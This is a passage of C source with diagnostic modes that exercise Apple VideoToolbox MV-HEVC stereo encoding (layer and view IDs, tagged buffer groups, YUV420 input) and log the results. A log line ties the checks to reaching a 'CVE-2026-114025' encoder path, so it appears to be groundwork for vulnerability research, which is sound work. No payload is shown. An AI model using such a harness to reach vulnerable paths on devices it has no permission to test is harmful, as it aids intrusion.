    } else if (strcmp(mode, "diag2") == 0) {
        rlog("DIAG2: MV-HEVC with only MVHEVCVideoLayerIDs (no eye IDs)\n\n");
        CFMutableDictionaryRef es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        VTCompressionSessionRef s = NULL;
        OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create: %d\n", (int)r);
        if (r == 0 && s) {
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

            /* Only MVHEVCVideoLayerIDs — no eye IDs */
            int b = 0, lid = 1;
            CFNumberRef i0 = CFNumberCreate(NULL, kCFNumberIntType, &b);
            CFNumberRef i1 = CFNumberCreate(NULL, kCFNumberIntType, &lid);
            CFArrayRef a = CFArrayCreate(NULL, (const void *[]){i0, i1}, 2, &kCFTypeArrayCallBacks);
            OSStatus sp = VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), a);
            rlog("MVHEVCVideoLayerIDs: %d\n", (int)sp);
            CFRelease(a); CFRelease(i0); CFRelease(i1);

            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            if (pr == 0) {
                g_cb_count = 0;
                int enc = encode_one(s, 0, 128, 128);
                rlog("Test A (LayerIDs only): status=%d, cb=%d, pset=%zu\n",
                     enc, g_cb_count, g_last_pset_count);
            }
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

        /* Test B: MVHEVCViewIDs only */
        rlog("\n--- Test B: MVHEVCViewIDs only ---\n");
        es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        s = NULL;
        r = VTCompressionSessionCreate(NULL, 128, 128,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create: %d\n", (int)r);
        if (r == 0 && s) {
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);

            int b = 0, lid = 1;
            CFNumberRef i0 = CFNumberCreate(NULL, kCFNumberIntType, &b);
            CFNumberRef i1 = CFNumberCreate(NULL, kCFNumberIntType, &lid);
            CFArrayRef a = CFArrayCreate(NULL, (const void *[]){i0, i1}, 2, &kCFTypeArrayCallBacks);
            OSStatus sp = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), a);
            rlog("MVHEVCViewIDs: %d\n", (int)sp);
            CFRelease(a); CFRelease(i0); CFRelease(i1);

            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            if (pr == 0) {
                g_cb_count = 0;
                int enc = encode_one(s, 0, 128, 128);
                rlog("Test B (ViewIDs only): status=%d, cb=%d, pset=%zu\n",
                     enc, g_cb_count, g_last_pset_count);
            }
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

        /* Test C: Both MVHEVCVideoLayerIDs + MVHEVCViewIDs */
        rlog("\n--- Test C: Both LayerIDs + ViewIDs ---\n");
        es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        s = NULL;
        r = VTCompressionSessionCreate(NULL, 128, 128,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create: %d\n", (int)r);
        if (r == 0 && s) {
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);

            int b = 0, lid = 1;
            CFNumberRef i0 = CFNumberCreate(NULL, kCFNumberIntType, &b);
            CFNumberRef i1 = CFNumberCreate(NULL, kCFNumberIntType, &lid);
            CFArrayRef a = CFArrayCreate(NULL, (const void *[]){i0, i1}, 2, &kCFTypeArrayCallBacks);
            VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), a);
            OSStatus sp = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), a);
            rlog("MVHEVCViewIDs (with LayerIDs): %d\n", (int)sp);
            CFRelease(a); CFRelease(i0); CFRelease(i1);

            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            if (pr == 0) {
                g_cb_count = 0;
                int enc = encode_one(s, 0, 128, 128);
                rlog("Test C (Both): status=%d, cb=%d, pset=%zu\n",
                     enc, g_cb_count, g_last_pset_count);
            }
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

    } else if (strcmp(mode, "diag3") == 0) {
        rlog("DIAG3: MV-HEVC Multi-Image Encode (CMTaggedBufferGroup)\n");
        rlog("Tests the CORRECT API for stereo MV-HEVC encoding\n\n");

        /* Test 0: Check VTIsStereoMVHEVCEncodeSupported */
        rlog("--- Test 0: VTIsStereoMVHEVCEncodeSupported() ---\n");
        extern Boolean VTIsStereoMVHEVCEncodeSupported(void)
            __attribute__((weak_import));
        if (VTIsStereoMVHEVCEncodeSupported) {
            Boolean sup = VTIsStereoMVHEVCEncodeSupported();
            rlog("VTIsStereoMVHEVCEncodeSupported = %s\n", sup ? "YES" : "NO");
            if (!sup) {
                rlog("FATAL: Device does NOT support stereo MV-HEVC encoding\n");
                rlog("This means CVE-2026-114025 MV-HEVC path is NOT available\n");
                goto done;
            }
        } else {
            rlog("VTIsStereoMVHEVCEncodeSupported not linked (pre-iOS 17?)\n");
        }

        /* Test 1: Create session with MVHEVCVideoLayerIDs + MVHEVCViewIDs,
           then use VTCompressionSessionEncodeMultiImageFrame with tagged buffers */
        rlog("\n--- Test 1: EncodeMultiImageFrame with CMTaggedBufferGroup ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(es);
            rlog("Create session: %d\n", (int)r);
            if (r != 0 || !s) { rlog("FAILED to create session\n"); goto done; }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

            /* Set MVHEVCVideoLayerIDs = [0, 1] */
            int v0 = 0, v1 = 1;
            CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
            CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
            CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
            OSStatus sp1 = VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
            rlog("MVHEVCVideoLayerIDs [0,1]: %d\n", (int)sp1);

            /* Set MVHEVCViewIDs = [0, 1] */
            OSStatus sp2 = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
            rlog("MVHEVCViewIDs [0,1]: %d\n", (int)sp2);

            /* Try HasLeftStereoEyeView / HasRightStereoEyeView */
            OSStatus sp3 = VTSessionSetProperty(s, CFSTR("HasLeftStereoEyeView"), kCFBooleanTrue);
            OSStatus sp4 = VTSessionSetProperty(s, CFSTR("HasRightStereoEyeView"), kCFBooleanTrue);
            rlog("HasLeftStereoEyeView: %d, HasRightStereoEyeView: %d\n", (int)sp3, (int)sp4);

            CFRelease(ids); CFRelease(n0); CFRelease(n1);

            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            if (pr != 0) {
                rlog("FAILED: PrepareToEncodeFrames = %d\n", (int)pr);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                goto done;
            }

            /* Create two pixel buffers: left eye and right eye */
            CVPixelBufferRef pb_left = create_pb(128, 128);
            CVPixelBufferRef pb_right = create_pb(128, 128);
            if (!pb_left || !pb_right) {
                rlog("FAILED: Could not create pixel buffers\n");
                if (pb_left) CVPixelBufferRelease(pb_left);
                if (pb_right) CVPixelBufferRelease(pb_right);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                goto done;
            }

            /* Fill right eye with different pattern for distinguishability */
            CVPixelBufferLockBaseAddress(pb_right, 0);
            void *rbase = CVPixelBufferGetBaseAddress(pb_right);
            if (rbase) memset(rbase, 0x84, 128 * 128 * 4);
            CVPixelBufferUnlockBaseAddress(pb_right, 0);

            /* Build CMTaggedBufferGroup with two tagged pixel buffers.
               Left eye: stereoView=leftEye, videoLayerID=0
               Right eye: stereoView=rightEye, videoLayerID=1 */

            /* Use pre-built stereo eye tags + video layer ID tags.
               kCMTagStereoLeftEye / kCMTagStereoRightEye are pre-made CMTag constants.
               Video layer IDs are built with CMTagMakeWithSInt64Value. */
            CMTag tag_layer_0 = CMTagMakeWithSInt64Value(
                kCMTagCategory_VideoLayerID, 0);
            CMTag left_tags[2] = { kCMTagStereoLeftEye, tag_layer_0 };
            CMTagCollectionRef left_tc = NULL;
            OSStatus tc1 = CMTagCollectionCreate(NULL, left_tags, 2, &left_tc);
            rlog("Left tag collection create: %d\n", (int)tc1);

            CMTag tag_layer_1 = CMTagMakeWithSInt64Value(
                kCMTagCategory_VideoLayerID, 1);
            CMTag right_tags[2] = { kCMTagStereoRightEye, tag_layer_1 };
            CMTagCollectionRef right_tc = NULL;
            OSStatus tc2 = CMTagCollectionCreate(NULL, right_tags, 2, &right_tc);
            rlog("Right tag collection create: %d\n", (int)tc2);

            if (tc1 != 0 || tc2 != 0) {
                rlog("FAILED: Could not create tag collections\n");
                if (left_tc) CFRelease(left_tc);
                if (right_tc) CFRelease(right_tc);
                CVPixelBufferRelease(pb_left);
                CVPixelBufferRelease(pb_right);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                goto done;
            }

            /* Create CMTaggedBufferGroup from two pixel buffers + tag collections */
            CMTagCollectionRef tag_colls[2] = { left_tc, right_tc };
            CVPixelBufferRef pbs[2] = { pb_left, pb_right };

            /* CMTaggedBufferGroupCreate(allocator, tagCollections, buffers, count, out) */
            CMTaggedBufferGroupRef tbg = NULL;
            CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tag_colls, 2,
                &kCFTypeArrayCallBacks);
            CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2,
                &kCFTypeArrayCallBacks);
            OSStatus tbg_st = CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
            rlog("CMTaggedBufferGroupCreate: %d, group=%p\n", (int)tbg_st, (void*)tbg);
            CFRelease(tc_arr);
            CFRelease(pb_arr);

            if (tbg_st != 0 || !tbg) {
                rlog("FAILED: Could not create tagged buffer group\n");
                CFRelease(left_tc); CFRelease(right_tc);
                CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                goto done;
            }

            /* Now call VTCompressionSessionEncodeMultiImageFrame */
            g_encode_done = 0;
            g_cb_status = -999;
            g_cb_count = 0;
            CMTime pts = CMTimeMake(0, 30);
            CMTime dur = CMTimeMake(1, 30);
            VTEncodeInfoFlags info_out = 0;

            /* Try the callback-based variant first */
            extern OSStatus VTCompressionSessionEncodeMultiImageFrame(
                VTCompressionSessionRef session,
                CMTaggedBufferGroupRef taggedBufferGroup,
                CMTime presentationTimeStamp,
                CMTime duration,
                CFDictionaryRef frameProperties,
                void *sourceFrameRefCon,
                VTEncodeInfoFlags *infoFlagsOut)
                __attribute__((weak_import));

            if (VTCompressionSessionEncodeMultiImageFrame) {
                OSStatus enc_st = VTCompressionSessionEncodeMultiImageFrame(
                    s, tbg, pts, dur, NULL, NULL, &info_out);
                rlog("EncodeMultiImageFrame: %d, infoFlags=%u\n",
                     (int)enc_st, (unsigned)info_out);

                if (enc_st == 0) {
                    /* Poll for callback */
                    for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                    rlog("After 5s poll: encode_done=%d, cb_status=%d, cb_count=%d, pset=%zu\n",
                         g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);

                    if (!g_encode_done) {
                        rlog("Trying CompleteFrames to flush...\n");
                        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                        for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
                        rlog("After CompleteFrames: done=%d, status=%d, cb=%d, pset=%zu\n",
                             g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                    }

                    if (g_encode_done && g_cb_status == 0) {
                        rlog("\n*** SUCCESS: MV-HEVC multi-image encode produced output! ***\n");
                        rlog("Parameter sets: %zu (expect 6 for stereo: 2xVPS+2xSPS+2xPPS)\n",
                             g_last_pset_count);
                    }
                } else {
                    rlog("EncodeMultiImageFrame FAILED: %d\n", (int)enc_st);
                }
            } else {
                rlog("VTCompressionSessionEncodeMultiImageFrame not available!\n");
                rlog("This API requires iOS 17+ / macOS 14+\n");
            }

            /* Cleanup */
            CFRelease(tbg);
            CFRelease(left_tc); CFRelease(right_tc);
            CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

        /* Test 2: Try single-frame encode with HasLeftStereoEyeView per-frame property */
        rlog("\n--- Test 2: Single EncodeFrame with per-frame stereo property ---\n");
        {
            VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
            if (s) {
                CVPixelBufferRef pb = create_pb(128, 128);
                if (pb) {
                    g_encode_done = 0;
                    g_cb_status = -999;
                    g_cb_count = 0;

                    /* Set per-frame property indicating this is a left eye frame */
                    CFMutableDictionaryRef fp = CFDictionaryCreateMutable(
                        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                    CFDictionarySetValue(fp, CFSTR("HasLeftStereoEyeView"), kCFBooleanTrue);

                    CMTime pts = CMTimeMake(0, 30);
                    CMTime dur = CMTimeMake(1, 30);
                    OSStatus enc_st = VTCompressionSessionEncodeFrame(
                        s, pb, pts, dur, fp, NULL, NULL);
                    rlog("EncodeFrame (with HasLeftStereoEyeView): %d\n", (int)enc_st);
                    CFRelease(fp);

                    for (int i = 0; i < 300 && !g_encode_done; i++) usleep(10000);
                    rlog("Result: done=%d, status=%d, cb=%d, pset=%zu\n",
                         g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                    CVPixelBufferRelease(pb);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

        /* Test 3: Software encoder fallback (no hardware requirement) */
        rlog("\n--- Test 3: MV-HEVC with software encoder ---\n");
        {
            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, NULL, NULL, NULL, encode_cb, NULL, &s);
            rlog("Create (software): %d\n", (int)r);
            if (r == 0 && s) {
                int v0 = 0, v1 = 1;
                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
                OSStatus sp1 = VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
                OSStatus sp2 = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
                rlog("MVHEVCVideoLayerIDs: %d, MVHEVCViewIDs: %d\n", (int)sp1, (int)sp2);
                CFRelease(ids); CFRelease(n0); CFRelease(n1);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    g_cb_count = 0;
                    int enc = encode_one(s, 0, 128, 128);
                    rlog("Software encode: status=%d, cb=%d, pset=%zu\n",
                         enc, g_cb_count, g_last_pset_count);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

    } else if (strcmp(mode, "diag4") == 0) {
        rlog("DIAG4: Fix MV-HEVC encode error -19034\n");
        rlog("Tests YUV420 pixel format + correct encoder spec\n\n");

        /* Helper: create YUV420 biplanar pixel buffer */
        CVPixelBufferRef (^create_yuv_pb)(int, int, uint8_t) = ^(int w, int h, uint8_t fill) {
            CVPixelBufferRef pb = NULL;
            CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
            CVReturn ret = CVPixelBufferCreate(NULL, w, h,
                kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, attrs, &pb);
            CFRelease(iosurf); CFRelease(attrs);
            if (ret != kCVReturnSuccess) { rlog("YUV PB create failed: %d\n", ret); return (CVPixelBufferRef)NULL; }
            CVPixelBufferLockBaseAddress(pb, 0);
            void *y_base = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
            void *uv_base = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
            if (y_base) memset(y_base, fill, CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * h);
            if (uv_base) memset(uv_base, 128, CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * (h/2));
            CVPixelBufferUnlockBaseAddress(pb, 0);
            return pb;
        };

        extern OSStatus VTCompressionSessionEncodeMultiImageFrame(
            VTCompressionSessionRef session,
            CMTaggedBufferGroupRef taggedBufferGroup,
            CMTime presentationTimeStamp,
            CMTime duration,
            CFDictionaryRef frameProperties,
            void *sourceFrameRefCon,
            VTEncodeInfoFlags *infoFlagsOut)
            __attribute__((weak_import));

        if (!VTCompressionSessionEncodeMultiImageFrame) {
            rlog("EncodeMultiImageFrame not available\n");
            goto done;
        }

        /* Test A: YUV420 pixel buffers with MVHEVCVideoLayerIDs+ViewIDs */
        rlog("--- Test A: YUV420 biplanar + EncodeMultiImageFrame ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

            /* Pixel buffer attributes specifying YUV420 */
            CFMutableDictionaryRef src_attrs = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int pf = kCVPixelFormatType_420YpCbCr8BiPlanarFullRange;
            CFNumberRef pf_num = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFDictionarySetValue(src_attrs, kCVPixelBufferPixelFormatTypeKey, pf_num);
            int pw = 128, ph = 128;
            CFNumberRef pw_num = CFNumberCreate(NULL, kCFNumberIntType, &pw);
            CFNumberRef ph_num = CFNumberCreate(NULL, kCFNumberIntType, &ph);
            CFDictionarySetValue(src_attrs, kCVPixelBufferWidthKey, pw_num);
            CFDictionarySetValue(src_attrs, kCVPixelBufferHeightKey, ph_num);

            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, src_attrs, NULL, encode_cb, NULL, &s);
            CFRelease(es); CFRelease(src_attrs); CFRelease(pf_num); CFRelease(pw_num); CFRelease(ph_num);
            rlog("Create (YUV420 src attrs): %d\n", (int)r);

            if (r == 0 && s) {
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

                int v0 = 0, v1 = 1;
                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
                OSStatus sp1 = VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
                OSStatus sp2 = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
                rlog("LayerIDs: %d, ViewIDs: %d\n", (int)sp1, (int)sp2);
                CFRelease(ids); CFRelease(n0); CFRelease(n1);

                /* Try setting HasLeftStereoEyeView + HasRightStereoEyeView */
                VTSessionSetProperty(s, CFSTR("HasLeftStereoEyeView"), kCFBooleanTrue);
                VTSessionSetProperty(s, CFSTR("HasRightStereoEyeView"), kCFBooleanTrue);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("Prepare: %d\n", (int)pr);

                if (pr == 0) {
                    CVPixelBufferRef left = create_yuv_pb(128, 128, 0x40);
                    CVPixelBufferRef right = create_yuv_pb(128, 128, 0x80);
                    rlog("Left PB: %p, Right PB: %p\n", (void*)left, (void*)right);

                    if (left && right) {
                        CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
                        CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
                        CMTagCollectionRef ltc = NULL;
                        CMTagCollectionCreate(NULL, left_tags, 2, &ltc);

                        CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
                        CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
                        CMTagCollectionRef rtc = NULL;
                        CMTagCollectionCreate(NULL, right_tags, 2, &rtc);

                        CMTagCollectionRef tcs[2] = { ltc, rtc };
                        CVPixelBufferRef pbs[2] = { left, right };
                        CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
                        CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
                        CMTaggedBufferGroupRef tbg = NULL;
                        OSStatus tbg_st = CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
                        rlog("TBG create: %d\n", (int)tbg_st);
                        CFRelease(tc_arr); CFRelease(pb_arr);

                        if (tbg_st == 0 && tbg) {
                            g_encode_done = 0; g_cb_status = -999; g_cb_count = 0;
                            VTEncodeInfoFlags fi = 0;
                            CMTime pts = CMTimeMake(0, 30);
                            CMTime dur = CMTimeMake(1, 30);
                            OSStatus enc = VTCompressionSessionEncodeMultiImageFrame(
                                s, tbg, pts, dur, NULL, NULL, &fi);
                            rlog("EncodeMultiImage: %d, flags=%u\n", (int)enc, (unsigned)fi);

                            if (enc == 0) {
                                for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                                rlog("Poll: done=%d, status=%d, cb=%d, pset=%zu, bytes=%zu\n",
                                     g_encode_done, (int)g_cb_status, g_cb_count,
                                     g_last_pset_count, g_last_pset_total_bytes);
                                if (!g_encode_done) {
                                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                                    for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
                                    rlog("After flush: done=%d, status=%d, cb=%d, pset=%zu\n",
                                         g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                                }
                                if (g_encode_done && g_cb_status == 0) {
                                    rlog("\n*** MV-HEVC ENCODE SUCCESS with YUV420! ***\n");
                                    rlog("pset=%zu bytes=%zu\n", g_last_pset_count, g_last_pset_total_bytes);
                                }
                            }
                            CFRelease(tbg);
                        }
                        CFRelease(ltc); CFRelease(rtc);
                    }
                    if (left) CVPixelBufferRelease(left);
                    if (right) CVPixelBufferRelease(right);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

        /* Test B: Try without HasLeft/RightStereoEyeView (maybe they conflict) */
        rlog("\n--- Test B: YUV420 without HasLeft/RightStereoEyeView ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(es);
            rlog("Create: %d\n", (int)r);
            if (r == 0 && s) {
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

                int v0 = 0, v1 = 1;
                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
                VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
                VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
                CFRelease(ids); CFRelease(n0); CFRelease(n1);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    CVPixelBufferRef left = create_yuv_pb(128, 128, 0x40);
                    CVPixelBufferRef right = create_yuv_pb(128, 128, 0x80);
                    if (left && right) {
                        CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
                        CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
                        CMTagCollectionRef ltc = NULL;
                        CMTagCollectionCreate(NULL, left_tags, 2, &ltc);
                        CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
                        CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
                        CMTagCollectionRef rtc = NULL;
                        CMTagCollectionCreate(NULL, right_tags, 2, &rtc);
                        CMTagCollectionRef tcs[2] = { ltc, rtc };
                        CVPixelBufferRef pbs[2] = { left, right };
                        CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
                        CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
                        CMTaggedBufferGroupRef tbg = NULL;
                        CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
                        CFRelease(tc_arr); CFRelease(pb_arr);
                        if (tbg) {
                            g_encode_done = 0; g_cb_status = -999; g_cb_count = 0;
                            VTEncodeInfoFlags fi = 0;
                            CMTime pts = CMTimeMake(0, 30);
                            CMTime dur = CMTimeMake(1, 30);
                            OSStatus enc = VTCompressionSessionEncodeMultiImageFrame(
                                s, tbg, pts, dur, NULL, NULL, &fi);
                            rlog("EncodeMultiImage: %d\n", (int)enc);
                            if (enc == 0) {
                                for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                                rlog("Poll: done=%d, status=%d, cb=%d, pset=%zu\n",
                                     g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                                if (!g_encode_done) {
                                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                                    for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
